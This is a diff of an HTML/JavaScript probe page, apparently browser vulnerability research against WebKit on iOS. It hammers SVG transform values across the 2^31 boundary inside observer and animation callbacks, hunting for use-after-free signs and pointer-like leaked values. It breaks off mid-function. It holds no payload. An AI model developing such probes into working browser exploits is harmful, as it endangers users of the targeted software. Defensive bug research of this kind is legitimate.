@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG v28 — Path Branch Race + Layout Confusion</title>
+<title>SVG v29 — MUT[1] Zero + ANM[2] SMIL Negative Hammer</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{background:#0a0a0a;color:#ccc;font-family:monospace;font-size:11px;padding:12px}
@@ -17,29 +17,32 @@ h2{color:#555;font-size:9px;text-transform:uppercase;letter-spacing:.12em;margin
 .star{background:#08081a;border-left:3px solid #66f;color:#99f}
 .crit{background:#160a00;border-left:3px solid #f80;color:#fc8;font-weight:bold}
 .uaf{background:#1a0000;border-left:4px solid #f00;color:#ff3333;font-weight:bold;font-size:12px;padding:6px 10px}
+.zero{background:#1a001a;border-left:4px solid #f0f;color:#f8f;font-weight:bold;font-size:12px;padding:6px 10px}
+.neg{background:#0d0010;border-left:4px solid #a0f;color:#c8f;font-weight:bold;padding:5px 8px}
 .hdr{color:#444;font-size:9px;text-transform:uppercase;letter-spacing:.08em;padding:2px 0 4px;border-bottom:1px solid #1a1a1a;margin-bottom:6px}
 button{background:#0e0e0e;color:#0d0;border:1px solid #0d0;padding:4px 10px;font-family:monospace;font-size:10px;cursor:pointer;border-radius:2px;margin:0 3px 4px 0}
 button:active{background:#0d0;color:#000}
 #btn-all{border-color:#cc0;color:#cc0}
 #btn-copy{border-color:#888;color:#888}
+#progress{color:#555;font-size:10px;padding:4px 0}
 </style>
 </head>
 <body>
-<h1>SVG v28 — Two-Path Branch Race + Layout Confusion</h1>
-<h2>iOS 26.5.2 · BRC / LAY / ANM / MUT / STK / CTM</h2>
+<h1>SVG v29 — MUT[1] Zero + ANM[2] SMIL Negative Hammer</h1>
+<h2>iOS 26.5.2 · RO / IO / PO / SM / ND / CT</h2>
 
 <div class="suite">
 <button id="btn-all" onclick="runAll()">▶ ALL</button>
-<button onclick="go('BRC')">BRC</button>
-<button onclick="go('LAY')">LAY</button>
-<button onclick="go('ANM')">ANM</button>
-<button onclick="go('MUT')">MUT</button>
-<button onclick="go('STK')">STK</button>
-<button onclick="go('CTM')">CTM</button>
+<button onclick="go('RO')">RO</button>
+<button onclick="go('IO')">IO</button>
+<button onclick="go('PO')">PO</button>
+<button onclick="go('SM')">SM</button>
+<button onclick="go('ND')">ND</button>
+<button onclick="go('CT')">CT</button>
 <button id="btn-copy" onclick="copyAll()">⎘ Copy</button>
 <button onclick="clearOut()">✕</button>
 </div>
-<div class="suite"><div id="out"></div></div>
+<div class="suite"><div id="progress"></div><div id="out"></div></div>
 
 <script>
 var NS='http://www.w3.org/2000/svg';
@@ -53,9 +56,12 @@ function log(m,c){
   e.className='result '+(c||'info');
   e.textContent=m;
   d.appendChild(e);
+  // auto-scroll to latest
+  e.scrollIntoView({block:'nearest'});
 }
+function prog(m){document.getElementById('progress').textContent=m;}
 function hdr(m){log(m,'hdr');}
-function clearOut(){document.getElementById('out').innerHTML='';}
+function clearOut(){document.getElementById('out').innerHTML='';prog('');}
 function copyAll(){
   var lines=[];
   document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
@@ -64,18 +70,20 @@ function copyAll(){
 function go(s){clearOut();window['run'+s]();}
 function runAll(){
   clearOut();
-  runBRC();
-  setTimeout(function(){runLAY();},500);
-  setTimeout(function(){runANM();},1000);
-  setTimeout(function(){runMUT();},1500);
-  setTimeout(function(){runSTK();},2000);
-  setTimeout(function(){runCTM();},2500);
+  runRO();
+  setTimeout(function(){runIO();},800);
+  setTimeout(function(){runPO();},1600);
+  setTimeout(function(){runSM();},2400);
+  setTimeout(function(){runND();},3200);
+  setTimeout(function(){runCT();},4000);
 }
 
 var _fb=new ArrayBuffer(8);
 var _dv=new Float64Array(_fb);
 var _uv=new Uint32Array(_fb);
 function f64hex(f){_dv[0]=f;return'0x'+_uv[1].toString(16).padStart(8,'0')+'_'+_uv[0].toString(16).padStart(8,'0');}
+function f64hi(f){_dv[0]=f;return _uv[1];}
+function f64lo(f){_dv[0]=f;return _uv[0];}
 
 function mkSVG(w,h,vb){
   var s=document.createElementNS(NS,'svg');
@@ -100,505 +108,594 @@ function bcr(el){try{return el.getBoundingClientRect();}catch(e){return null;}}
 function ctm(el){try{return el.getScreenCTM();}catch(e){return null;}}
 
 // ════════════════════════════════════════════════════════════════════════
-// BRC — branch confusion: rapid flip across the 2^31 threshold
-// The matrix path switches code at mx.e = 2^31 (v26/v27 confirmed).
-// Flip rapidly between INT32_MAX (LU path) and INT32_OVF (other path)
-// while reading BCR/CTM — look for any inconsistency, leaked state, or
-// values that don't match either path cleanly.
+// RO — ResizeObserver hammer: v28 found BCR.x=0 when mutating mx.e inside RO callback
+// Now: 500 iterations, capture zero rate, zero timing, CTM at zero moment,
+// try to read something useful FROM the zero state
 // ════════════════════════════════════════════════════════════════════════
-function runBRC(){
-  hdr('BRC: rapid flip across 2^31 branch threshold');
-  var svg=mkSVG(100,100);
-  var r=mkRect(svg,0,0,10,10);
-  var mx=getMX(r);
-  svg.removeChild(r);
+function runRO(){
+  hdr('RO: ResizeObserver BCR=0 hammer (500 iters)');
 
-  // BRC[1]: alternating reads — does the BCR ever return a "confused" value?
-  hdr('BRC[1]: alternating INT32_MAX / INT32_OVF — look for non-canonical BCR values');
-  var anomalies=[];
-  for(var i=0;i<200;i++){
-    // Alternate between the two path-triggering values
-    var useOvf=(i%2===0);
-    mx.e=useOvf?INT32_OVF:INT32_MAX;
-    svg.appendChild(r);
-    var b=bcr(r);
-    svg.removeChild(r);
-    var bx=b?b.x:null;
-    // Canonical: INT32_MAX → 33544432 (LU_MAX path), INT32_OVF → 2147473664 (other path)
-    var canonical_max=33544432;
-    var canonical_ovf=2147473664;
-    var expected=useOvf?canonical_ovf:canonical_max;
-    if(bx!==null&&bx!==expected){
-      anomalies.push({i:i,input:useOvf?'INT32_OVF':'INT32_MAX',expected:expected,got:bx});
-      log('BRC[1]: iter='+i+' input='+mx.e+' expected='+expected+' got='+bx+' ANOMALY!',
-        (bx<0?'uaf — NEGATIVE FROM BRANCH RACE!':
-         bx>canonical_ovf?'uaf — ABOVE EXPECTED MAX! '+bx:
-         'crit — WRONG VALUE: '+bx));
-    }
-  }
-  log('BRC[1]: 200 iters done. anomalies='+anomalies.length,anomalies.length>0?'crit':'pass');
-
-  // BRC[2]: write INT32_MAX, force layout, then switch to INT32_OVF before layout completes
-  hdr('BRC[2]: write→read interleaved with forced reflow');
-  var results2=[];
-  for(var j=0;j<50;j++){
-    mx.e=INT32_MAX;  // LU clamp path
-    svg.appendChild(r);
-    // Force partial layout by reading offsetParent (triggers style recalc)
-    var _ = r.ownerSVGElement ? r.ownerSVGElement.parentNode : null;
-    mx.e=INT32_OVF;  // switch to other path BEFORE getBCR
-    var b2=bcr(r);
-    svg.removeChild(r);
-    results2.push(b2?b2.x:null);
-  }
-  // check if any result is between canonical values (confused state)
-  var between=results2.filter(function(v){return v!==null&&v>33544432&&v<2147473664;});
-  var below=results2.filter(function(v){return v!==null&&v<0;});
-  log('BRC[2]: 50 iters. between-paths='+between.length+' negative='+below.length,
-    (below.length>0?'uaf — NEGATIVE BCR IN INTERLEAVED READ!':
-     between.length>0?'crit — VALUE BETWEEN PATHS: '+between[0]:
-     'pass — consistent'));
-  if(between.length>0)log('BRC[2]: between-path values: '+between.slice(0,5).join(', '),'crit');
-
-  // BRC[3]: write to mx.e while element is being measured by requestAnimationFrame
-  hdr('BRC[3]: rAF-timed switch — mutate matrix during frame boundary');
-  var rafResults=[];
-  var rafDone=false;
-  mx.e=INT32_MAX;
-  svg.appendChild(r);
-  var rafCount=0;
-  function rafFlip(){
-    if(rafCount>=30){
-      rafDone=true;
-      var neg=rafResults.filter(function(v){return v<0;});
-      var anom=rafResults.filter(function(v){return v>0&&v!==33544432&&v!==2147473664&&v!==2147483648;});
-      log('BRC[3]: 30 rAF iters. negative='+neg.length+' anomalous='+anom.length,
-        (neg.length>0?'uaf — NEGATIVE IN rAF RACE!':
-         anom.length>0?'crit — ANOMALOUS IN rAF: '+anom[0]:
-         'pass'));
-      svg.removeChild(r);
-      svg.remove();
-      return;
-    }
-    // Flip between the two threshold values each frame
-    mx.e=(rafCount%2===0)?INT32_OVF:INT32_MAX;
-    var rb=bcr(r);
-    rafResults.push(rb?rb.x:null);
-    rafCount++;
-    requestAnimationFrame(rafFlip);
-  }
-  requestAnimationFrame(rafFlip);
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// LAY — layout tree confusion: two elements sharing a matrix, one on each path
-// Can we get the layout engine to compute one element's position using
-// another element's (wrong) branch?
-// ════════════════════════════════════════════════════════════════════════
-function runLAY(){
-  hdr('LAY: shared transform list — two elements, both paths simultaneously');
+  var ITERS=500;
+  var zeros=[];
+  var negatives=[];
+  var between=[];
+  var iter=0;
   var svg=mkSVG(100,100);
 
-  // LAY[1]: two rects share a transform, set one to LU path, one to overflow path
-  // In SVG, each element has its own transform list, can't truly share
-  // But: <g> parent transform affects children — can we confuse via group
-  var g=document.createElementNS(NS,'g');
-  g.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  svg.appendChild(g);
-  var mxG=g.transform.baseVal.getItem(0).matrix;
+  function nextIter(){
+    if(iter>=ITERS){
+      prog('RO done');
+      log('RO[1]: '+ITERS+' iters complete. zeros='+zeros.length+' negatives='+negatives.length+' between='+between.length,
+        (negatives.length>0?'uaf — NEGATIVES IN RO!':
+         zeros.length>0?'zero — ZERO BCR CONFIRMED: '+zeros.length+'/'+ITERS+' rate':
+         'pass — no anomalies'));
 
-  var r1=mkRect(g,0,0,10,10);
-  var r2=mkRect(g,5,0,10,10);
-
-  // Set group transform to LU path
-  mxG.e=INT32_MAX;  // → LU clamp (33.5M)
-  var b1a=bcr(r1);var b2a=bcr(r2);
-  log('LAY[1]: group e=INT32_MAX: r1.x='+( b1a?b1a.x:null)+' r2.x='+(b2a?b2a.x:null),'info');
-
-  // Switch group to overflow path
-  mxG.e=INT32_OVF;  // → float path (2.147B)
-  var b1b=bcr(r1);var b2b=bcr(r2);
-  log('LAY[1]: group e=INT32_OVF: r1.x='+(b1b?b1b.x:null)+' r2.x='+(b2b?b2b.x:null),'info');
-
-  // Now: set r1 to have its own LU-path transform WHILE group is on OVF path
-  r1.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  var mxR1=r1.transform.baseVal.getItem(0).matrix;
-  mxR1.e=INT32_MAX;  // local: LU path
-  // group: INT32_OVF (overflow path)
-  // total transform = group * local. Does the combination confuse the branch?
-  var b1c=bcr(r1);
-  log('LAY[1]: combined (group OVF + local LU): r1.x='+(b1c?b1c.x:null),
-    (b1c&&b1c.x<0?'uaf — NEGATIVE IN COMBINED TRANSFORM!':
-     b1c&&b1c.x>INT32_OVF?'uaf — PAST 2^31 IN COMBINED!':
-     'info'));
-
-  // LAY[2]: deeply nested — each level at the threshold, compound effect
-  hdr('LAY[2]: 4-deep nested groups each at INT32_OVF — does compound confuse?');
-  var g1=document.createElementNS(NS,'g');g1.setAttribute('transform','matrix(1 0 0 1 0 0)');svg.appendChild(g1);
-  var g2=document.createElementNS(NS,'g');g2.setAttribute('transform','matrix(1 0 0 1 0 0)');g1.appendChild(g2);
-  var g3=document.createElementNS(NS,'g');g3.setAttribute('transform','matrix(1 0 0 1 0 0)');g2.appendChild(g3);
-  var r3=mkRect(g3,0,0,10,10);
-
-  var mx1=g1.transform.baseVal.getItem(0).matrix;
-  var mx2=g2.transform.baseVal.getItem(0).matrix;
-  var mx3=g3.transform.baseVal.getItem(0).matrix;
-
-  // all at INT32_OVF — the multiplied result would be astronomical
-  mx1.e=0;mx2.e=0;mx3.e=0;  // baseline
-  var b3base=bcr(r3);
-  log('LAY[2]: baseline: r3.x='+(b3base?b3base.x:null),'info');
-
-  mx1.e=INT32_OVF;
-  var b3one=bcr(r3);
-  log('LAY[2]: g1 at INT32_OVF: r3.x='+(b3one?b3one.x:null),'info');
-
-  mx2.e=INT32_OVF;
-  var b3two=bcr(r3);
-  log('LAY[2]: g1+g2 at INT32_OVF: r3.x='+(b3two?b3two.x:null),
-    (b3two&&b3two.x<0?'uaf — NEGATIVE FROM NESTED OVF TRANSFORMS!':'info'));
-
-  mx3.e=INT32_OVF;
-  var b3three=bcr(r3);
-  log('LAY[2]: all 3 groups at INT32_OVF: r3.x='+(b3three?b3three.x:null),
-    (b3three&&b3three.x<0?'uaf — NEGATIVE FROM TRIPLE NESTED!':'info'));
-
-  // what does CTM say?
-  var ctm3=ctm(r3);
-  log('LAY[2]: getScreenCTM with triple nest: e='+(ctm3?ctm3.e:null),
-    (ctm3&&ctm3.e<0?'uaf — CTM NEGATIVE FROM NESTED OVF!':
-     ctm3&&ctm3.e>INT32_OVF?'star — CTM past 2^31 in nested: '+ctm3.e:'info'));
-
-  svg.remove();
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// ANM — animation path: can SMIL or CSS animation flip the matrix
-// through the branch point at a moment the layout engine isn't expecting?
-// ════════════════════════════════════════════════════════════════════════
-function runANM(){
-  hdr('ANM: animation through the branch threshold');
-  var svg=mkSVG(100,100);
-  var r=mkRect(svg,0,0,10,10);
-  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
-
-  // ANM[1]: CSS animation on transform — does it cross the branch threshold mid-animation?
-  hdr('ANM[1]: CSS keyframe animation crossing INT32_MAX→INT32_OVF boundary');
-  // Can't animate matrix.e directly via CSS on SVG easily
-  // But: use JS requestAnimationFrame to simulate, capture every frame's BCR
-  var mx=r.transform.baseVal.getItem(0).matrix;
-  var frames=[];
-  var frameCount=0;
-  var maxFrames=60;
-
-  function animFrame(){
-    if(frameCount>=maxFrames){
-      // analyze
-      var crossing=frames.filter(function(f){return f.bx>LU_MAX&&f.bx<2147473664;});
-      var negative=frames.filter(function(f){return f.bx<0;});
-      log('ANM[1]: '+maxFrames+' frames sampled. crossing='+crossing.length+' negative='+negative.length,
-        (negative.length>0?'uaf — NEGATIVE BCR DURING ANIMATION!':
-         crossing.length>0?'crit — VALUE IN NO-MAN ZONE DURING ANIM: '+crossing[0].bx:
-         'info — clean transition'));
-      if(crossing.length>0){
-        crossing.slice(0,3).forEach(function(f){
-          log('ANM[1]:   frame '+f.i+' e='+f.e+' BCR.x='+f.bx,'crit');
+      if(zeros.length>0){
+        log('RO[1]: zero rate = '+(zeros.length/ITERS*100).toFixed(1)+'%','zero');
+        // show first few zero hits
+        zeros.slice(0,5).forEach(function(z,i){
+          log('RO[1]: zero hit #'+i+': iter='+z.iter+' ctm_at_zero='+z.ctm+' bits_hi='+z.hi+' bits_lo='+z.lo,'zero');
         });
       }
-      svg.remove();
+      if(negatives.length>0){
+        negatives.slice(0,5).forEach(function(n,i){
+          log('RO[1]: NEGATIVE hit #'+i+': iter='+n.iter+' BCR.x='+n.bx+' CTM.e='+n.ctm,'uaf');
+        });
+      }
+
+      // RO[2]: probe what we can do with the zero state
+      hdr('RO[2]: zero-state exploitation probe');
+      roProbeZeroState(svg);
       return;
     }
-    // linear interpolation from INT32_MAX-1000 through INT32_OVF+1000
-    var t=frameCount/maxFrames;
-    var eVal=INT32_MAX-1000 + t*(INT32_OVF+1000 - (INT32_MAX-1000));
-    mx.e=eVal;
-    var b=bcr(r);
-    frames.push({i:frameCount,e:eVal,bx:b?b.x:null});
-    frameCount++;
-    requestAnimationFrame(animFrame);
-  }
-  requestAnimationFrame(animFrame);
 
-  // ANM[2]: SMIL animate element crossing threshold
-  hdr('ANM[2]: SMIL animateTransform across INT32 boundary');
-  var svg2=mkSVG(100,100);
-  var r2=mkRect(svg2,0,0,10,10);
-  var anim=document.createElementNS(NS,'animateTransform');
-  anim.setAttribute('attributeName','transform');
-  anim.setAttribute('type','translate');
-  anim.setAttribute('from',INT32_MAX+' 0');
-  anim.setAttribute('to',(INT32_OVF+1000)+' 0');
-  anim.setAttribute('dur','0.5s');
-  anim.setAttribute('repeatCount','3');
-  r2.appendChild(anim);
+    if(iter%50===0)prog('RO: '+iter+'/'+ITERS);
 
-  var smilFrames=[];
-  var smilCount=0;
-  function smilSample(){
-    if(smilCount>=30){
-      var neg=smilFrames.filter(function(v){return v<0;});
-      var anom=smilFrames.filter(function(v){return v!==null&&v>LU_MAX&&v<2147473664;});
-      log('ANM[2]: SMIL 30 samples. negative='+neg.length+' anomalous='+anom.length,
-        (neg.length>0?'uaf — NEGATIVE IN SMIL ANIM!':
-         anom.length>0?'crit — ANOMALOUS IN SMIL: '+anom[0]:
-         'info'));
-      svg2.remove();
-      return;
-    }
-    var b2=bcr(r2);
-    smilFrames.push(b2?b2.x:null);
-    smilCount++;
-    setTimeout(smilSample,16);
-  }
-  smilSample();
-}
+    var r=mkRect(svg,0,0,10,10);
+    getMX(r);
+    var mx=r.transform.baseVal.getItem(0).matrix;
+    mx.e=INT32_MAX;
 
-// ════════════════════════════════════════════════════════════════════════
-// MUT — mutation during layout: modify matrix.e from a MutationObserver
-// or ResizeObserver callback — these fire during the style/layout phase
-// ════════════════════════════════════════════════════════════════════════
-function runMUT(){
-  hdr('MUT: mutation during layout phase via observer callbacks');
-  var svg=mkSVG(100,100);
-
-  // MUT[1]: ResizeObserver fires during layout — mutate matrix.e inside it
-  hdr('MUT[1]: ResizeObserver callback — mutate to INT32_OVF during layout');
-  var r=mkRect(svg,0,0,10,10);
-  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  var mx=r.transform.baseVal.getItem(0).matrix;
-  mx.e=INT32_MAX;  // start on LU path
-
-  var roFired=false;
-  var roBCR=null;
-  var roE=null;
-  if(typeof ResizeObserver!=='undefined'){
-    var ro=new ResizeObserver(function(entries){
-      if(!roFired){
-        roFired=true;
-        // Switch to overflow path INSIDE the layout callback
+    var fired=false;
+    var ro=new ResizeObserver(function(){
+      if(!fired){
+        fired=true;
         mx.e=INT32_OVF;
-        roE=mx.e;
-        roBCR=bcr(r);
+        var b=bcr(r);
+        var bx=b?b.x:null;
+        var c=ctm(r);
+        var ce=c?c.e:null;
+
+        if(bx===0||bx===null){
+          zeros.push({iter:iter,ctm:ce,hi:ce?f64hi(ce):null,lo:ce?f64lo(ce):null});
+        } else if(bx<0){
+          negatives.push({iter:iter,bx:bx,ctm:ce});
+        } else if(bx>0&&bx!==LU_MAX&&bx<2147473664){
+          between.push({iter:iter,bx:bx});
+        }
+
         ro.disconnect();
-        log('MUT[1]: ResizeObserver fired. e='+roE+' BCR.x='+(roBCR?roBCR.x:null),
-          (roBCR&&roBCR.x<0?'uaf — NEGATIVE BCR IN ResizeObserver!':
-           roBCR&&roBCR.x>LU_MAX&&roBCR.x<2147473664?'crit — NO-MAN ZONE IN ResizeObserver: '+roBCR.x:
-           'info'));
-        // After observer: what does a fresh BCR say?
-        var freshBCR=bcr(r);
-        log('MUT[1]: fresh BCR after RO mutation: '+( freshBCR?freshBCR.x:null),
-          (freshBCR&&freshBCR.x<0?'uaf':'info'));
+        svg.removeChild(r);
+        iter++;
+        // batch to avoid stack overflow
+        if(iter%10===0){setTimeout(nextIter,0);}else{nextIter();}
       }
     });
     ro.observe(r);
-    // Trigger resize by changing width
     r.setAttribute('width','20');
-  } else {
-    log('MUT[1]: ResizeObserver not available','warn');
   }
 
-  // MUT[2]: MutationObserver on the transform attribute — mutate inside callback
-  hdr('MUT[2]: MutationObserver on transform attr — flip matrix during callback');
-  var r2=mkRect(svg,0,0,10,10);
-  r2.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  var mx2=r2.transform.baseVal.getItem(0).matrix;
-  var moFired=0;
-  var moBCRs=[];
+  nextIter();
 
-  var mo=new MutationObserver(function(mutations){
-    moFired++;
-    if(moFired<=5){
-      // flip to overflow path inside MutationObserver callback
-      var old=mx2.e;
-      mx2.e=(mx2.e===INT32_MAX?INT32_OVF:INT32_MAX);
-      var mb=bcr(r2);
-      moBCRs.push({old:old,new_e:mx2.e,bx:mb?mb.x:null});
-      if(moFired===5){
-        mo.disconnect();
-        var neg=moBCRs.filter(function(v){return v.bx<0;});
-        var anom=moBCRs.filter(function(v){
-          return v.bx!==null&&v.bx!==33544432&&v.bx!==2147473664&&v.bx!==2147483648&&v.bx>0;
+  // RO[3]: try MULTIPLE elements in one RO callback
+  hdr('RO[3]: multiple elements in single RO callback — do they all zero?');
+  var svg3=mkSVG(200,200);
+  var rects3=[];
+  var mxs3=[];
+  for(var i=0;i<5;i++){
+    var rr=mkRect(svg3,i*15,0,10,10);
+    getMX(rr);
+    mxs3.push(rr.transform.baseVal.getItem(0).matrix);
+    rects3.push(rr);
+  }
+  // set all to LU path
+  mxs3.forEach(function(m){m.e=INT32_MAX;});
+
+  var ro3=new ResizeObserver(function(entries){
+    // switch ALL to OVF path inside callback
+    mxs3.forEach(function(m){m.e=INT32_OVF;});
+    var bcrVals=rects3.map(function(r3){var b=bcr(r3);return b?b.x:null;});
+    var ctmVals=rects3.map(function(r3){var c=ctm(r3);return c?c.e:null;});
+    var zeroCount=bcrVals.filter(function(v){return v===0;}).length;
+    var negCount=bcrVals.filter(function(v){return v!==null&&v<0;}).length;
+    log('RO[3]: multi-element callback: BCRs=['+bcrVals.join(',')+'] zeros='+zeroCount+' negs='+negCount,
+      (negCount>0?'uaf — MULTI-ELEMENT NEGATIVE!':
+       zeroCount>0?'zero — '+zeroCount+'/5 ELEMENTS ZERO! BCRs: '+bcrVals.join(','):
+       'info — BCRs: '+bcrVals.join(',')));
+    log('RO[3]: CTMs=['+ctmVals.join(',')+']',
+      (ctmVals.some(function(v){return v!==null&&v<0;})?'uaf — NEGATIVE CTM IN MULTI!':'info'));
+    ro3.disconnect();
+    svg3.remove();
+  });
+  ro3.observe(rects3[0]);
+  rects3[0].setAttribute('width','30');
+}
+
+function roProbeZeroState(svg){
+  // When BCR.x=0, what else can we read?
+  // - Can we read CTM at the exact zero moment and get a useful address-like value?
+  // - Does a second consecutive BCR read also return 0?
+  // - Does removing + re-adding the element fix it?
+
+  var probeZeros=0;
+  var probeIter=0;
+  var PROBE_ITERS=100;
+
+  function probeNext(){
+    if(probeIter>=PROBE_ITERS){
+      log('RO[2]: '+PROBE_ITERS+' probe iters. hit-count='+probeZeros,'info');
+      svg.remove();
+      return;
+    }
+
+    var r=mkRect(svg,0,0,10,10);
+    getMX(r);
+    var mx=r.transform.baseVal.getItem(0).matrix;
+    mx.e=INT32_MAX;
+
+    var proFired=false;
+    var ro=new ResizeObserver(function(){
+      if(!proFired){
+        proFired=true;
+        mx.e=INT32_OVF;
+        var b1=bcr(r);
+
+        if(b1&&b1.x===0){
+          probeZeros++;
+          // Deep probe of the zero state
+          var c1=ctm(r);      // CTM at zero moment
+          var b2=bcr(r);      // second BCR read — still 0?
+          var b3=bcr(r);      // third read
+          // try reading width/height — are they also 0?
+          var w=b1.width,h=b1.height,right=b1.right,bottom=b1.bottom;
+          // try getComputedStyle
+          var cs=window.getComputedStyle?window.getComputedStyle(r):null;
+
+          log('RO[2]: ZERO HIT #'+probeZeros+
+            ' b1=['+b1.x+','+b1.y+','+b1.width+','+b1.height+']'+
+            ' b2.x='+(b2?b2.x:null)+
+            ' b3.x='+(b3?b3.x:null)+
+            ' ctm.e='+(c1?c1.e:null)+
+            ' ctm.f='+(c1?c1.f:null),
+            (b2&&b2.x!==0?'crit — ZERO THEN NON-ZERO: b2='+b2.x:
+             c1&&c1.e!==0?'star — CTM NOT ZERO WHEN BCR IS: ctm.e='+c1.e:
+             'zero'));
+
+          // Is CTM.e a pointer-like value when BCR is 0?
+          if(c1&&c1.e!==0&&c1.e!==b1.x){
+            log('RO[2]:   CTM.e='+c1.e+' bits='+f64hex(c1.e)+
+              ' hi=0x'+f64hi(c1.e).toString(16),'star — CTM DIVERGES FROM BCR=0');
+          }
+        }
+        ro.disconnect();
+        svg.removeChild(r);
+        probeIter++;
+        setTimeout(probeNext,0);
+      }
+    });
+    ro.observe(r);
+    r.setAttribute('width','20');
+  }
+
+  probeNext();
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// IO — IntersectionObserver: fires during layout phase like RO
+// Try the same BCR=0 trigger via IO callback
+// ════════════════════════════════════════════════════════════════════════
+function runIO(){
+  hdr('IO: IntersectionObserver callback mutation (200 iters)');
+
+  if(typeof IntersectionObserver==='undefined'){
+    log('IO: IntersectionObserver not available','warn');
+    return;
+  }
+
+  var ITERS=200;
+  var zeros=[];var negs=[];var iter=0;
+  var svg=mkSVG(100,100);
+
+  function nextIter(){
+    if(iter>=ITERS){
+      prog('IO done');
+      log('IO[1]: '+ITERS+' iters. zeros='+zeros.length+' negatives='+negs.length,
+        (negs.length>0?'uaf — NEGATIVES IN IO!':
+         zeros.length>0?'zero — IO ZERO BCR: '+zeros.length+'/'+ITERS:
+         'pass'));
+      if(zeros.length>0){zeros.slice(0,3).forEach(function(z,i){log('IO[1]: zero #'+i+': iter='+z.iter+' ctm='+z.ctm,'zero');});}
+      svg.remove();
+      return;
+    }
+
+    if(iter%40===0)prog('IO: '+iter+'/'+ITERS);
+
+    var r=mkRect(svg,0,0,10,10);
+    getMX(r);
+    var mx=r.transform.baseVal.getItem(0).matrix;
+    mx.e=INT32_MAX;
+
+    var fired=false;
+    var io=new IntersectionObserver(function(){
+      if(!fired){
+        fired=true;
+        mx.e=INT32_OVF;
+        var b=bcr(r);
+        var bx=b?b.x:null;
+        var c=ctm(r);
+        if(bx===0)zeros.push({iter:iter,ctm:c?c.e:null});
+        else if(bx!==null&&bx<0)negs.push({iter:iter,bx:bx,ctm:c?c.e:null});
+        io.disconnect();
+        svg.removeChild(r);
+        iter++;
+        setTimeout(nextIter,0);
+      }
+    });
+    io.observe(r);
+    // trigger intersection by making the element visible
+    r.style.cssText='position:fixed;left:0;top:0;width:10px;height:10px';
+    setTimeout(function(){},10);
+    iter++;
+    setTimeout(nextIter,20);
+  }
+
+  nextIter();
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// PO — PerformanceObserver: fires during paint phase
+// Can we mutate matrix during paint callback and get anomalous BCR?
+// ════════════════════════════════════════════════════════════════════════
+function runPO(){
+  hdr('PO: PerformanceObserver (paint timing) mutation probe');
+
+  if(typeof PerformanceObserver==='undefined'){
+    log('PO: PerformanceObserver not available','warn');
+    return;
+  }
+
+  var poResults=[];
+  var svg=mkSVG(100,100);
+  var r=mkRect(svg,0,0,10,10);
+  getMX(r);
+  var mx=r.transform.baseVal.getItem(0).matrix;
+  mx.e=INT32_MAX;
+
+  try{
+    var po=new PerformanceObserver(function(list){
+      // mutate DURING paint observation
+      mx.e=INT32_OVF;
+      var b=bcr(r);
+      var c=ctm(r);
+      poResults.push({bx:b?b.x:null,ce:c?c.e:null});
+      if(poResults.length>=5){
+        po.disconnect();
+        var zeros=poResults.filter(function(v){return v.bx===0;});
+        var negs=poResults.filter(function(v){return v.bx!==null&&v.bx<0;});
+        log('PO[1]: '+poResults.length+' paint callbacks. zeros='+zeros.length+' negs='+negs.length,
+          (negs.length>0?'uaf — NEGATIVE IN PAINT CALLBACK!':
+           zeros.length>0?'zero — ZERO BCR IN PAINT!':
+           'info — BCRs: '+poResults.map(function(v){return v.bx;}).join(',')));
+        svg.remove();
+      }
+    });
+    po.observe({entryTypes:['paint','largest-contentful-paint']});
+    // trigger paint by forcing layout change
+    r.setAttribute('width','15');
+    setTimeout(function(){r.setAttribute('width','20');},50);
+    setTimeout(function(){
+      if(poResults.length===0){
+        log('PO[1]: no paint entries fired (normal on iOS)','warn');
+        try{po.disconnect();}catch(e){}
+        svg.remove();
+      }
+    },500);
+  } catch(e){
+    log('PO[1]: PerformanceObserver error: '+e.message,'warn');
+    svg.remove();
+  }
+
+  // PO[2]: requestAnimationFrame + mutation at paint boundary
+  hdr('PO[2]: rAF double-buffer trick — write in rAF, read in next rAF');
+  var svg2=mkSVG(100,100);
+  var r2=mkRect(svg2,0,0,10,10);
+  getMX(r2);
+  var mx2=r2.transform.baseVal.getItem(0).matrix;
+  var rafPairs=[];
+  var rafIter=0;
+  var MAX_RAF=100;
+
+  function rafWrite(){
+    if(rafIter>=MAX_RAF){
+      var zeros=rafPairs.filter(function(v){return v.bx===0;});
+      var negs=rafPairs.filter(function(v){return v.bx!==null&&v.bx<0;});
+      var between=rafPairs.filter(function(v){return v.bx!==null&&v.bx>0&&v.bx!==LU_MAX&&v.bx<2147473664;});
+      log('PO[2]: '+MAX_RAF+' rAF pairs. zeros='+zeros.length+' negs='+negs.length+' between='+between.length,
+        (negs.length>0?'uaf — NEGATIVE IN RAF PAIR!':
+         zeros.length>0?'zero — ZERO IN RAF PAIR: '+zeros.length+'/'+MAX_RAF:
+         between.length>0?'crit — BETWEEN-PATH: '+between[0].bx:
+         'pass'));
+      svg2.remove();
+      return;
+    }
+    // Write in rAF N
+    mx2.e=INT32_OVF;
+    requestAnimationFrame(function(){
+      // Read in rAF N+1 (after paint)
+      var b=bcr(r2);
+      var c=ctm(r2);
+      rafPairs.push({bx:b?b.x:null,ce:c?c.e:null});
+      mx2.e=INT32_MAX;  // reset for next iter
+      rafIter++;
+      requestAnimationFrame(rafWrite);
+    });
+  }
+  requestAnimationFrame(rafWrite);
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// SM — SMIL negative hammer: v28 ANM[2] got negative=1 in 30 samples
+// Now hammer 1000 SMIL samples to characterize the negative hit rate
+// ════════════════════════════════════════════════════════════════════════
+function runSM(){
+  hdr('SM: SMIL negative BCR hammer — 1000 samples');
+  var svg=mkSVG(100,100);
+  var r=mkRect(svg,0,0,10,10);
+
+  // SM[1]: animateTransform through INT32 boundary, sample heavily
+  hdr('SM[1]: SMIL animateTransform INT32_MAX→INT32_OVF, 1000 samples at 8ms intervals');
+  var anim=document.createElementNS(NS,'animateTransform');
+  anim.setAttribute('attributeName','transform');
+  anim.setAttribute('type','translate');
+  anim.setAttribute('from',(INT32_MAX-1000)+' 0');
